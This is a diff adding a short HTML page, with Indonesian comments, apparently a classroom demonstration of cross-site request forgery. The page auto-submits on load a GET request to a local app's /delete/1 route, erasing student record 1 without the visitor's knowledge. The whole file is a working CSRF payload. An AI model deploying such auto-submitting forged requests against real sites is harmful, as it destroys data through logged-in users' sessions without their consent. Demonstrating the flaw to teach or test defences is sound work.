@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Delete Student ID 1</title>
+</head>
+<body>
+    <h1>CSRF Attack Demo</h1>
+    <p>Halaman ini akan menghapus student dengan ID=1</p>
+
+    <!-- Form otomatis submit -->
+    <form id="deleteForm" action="http://localhost:5000/delete/1" method="GET">
+        <input type="submit" value="Hapus Data">
+    </form>
+
+    <script>
+        // Auto-submit saat halaman dimuat
+        window.onload = function() {
+            document.getElementById('deleteForm').submit();
+        }
+    </script>
+</body>
+</html>
